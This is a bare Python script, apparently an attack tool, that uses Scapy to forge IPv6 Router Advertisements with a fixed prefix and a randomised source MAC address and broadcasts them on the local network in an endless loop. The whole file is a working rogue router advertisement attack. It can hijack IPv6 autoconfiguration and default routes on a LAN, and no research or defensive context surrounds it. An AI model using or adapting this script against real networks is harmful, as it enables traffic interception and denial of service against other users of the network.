from scapy.all import sendp,Ether
from scapy.layers.inet6 import IPv6, ICMPv6ND_RA, ICMPv6NDOptPrefixInfo,ICMPv6NDOptSrcLLAddr

from random import randint

def randomacaddr():
	return ':'.join(map(lambda x: "%02x" % x, [ 0x00, 0x16, 0x3e,randint(0x00, 0x7f),randint(0x00, 0xff),randint(0x00, 0xff) ]))

pkt = Ether()/IPv6()/ICMPv6ND_RA()/ICMPv6NDOptPrefixInfo(prefix='2610:8:6800:1::7',prefixlen=64) \
/ICMPv6NDOptSrcLLAddr(lladdr=randomacaddr())
sendp(pkt,loop=1,inter=3)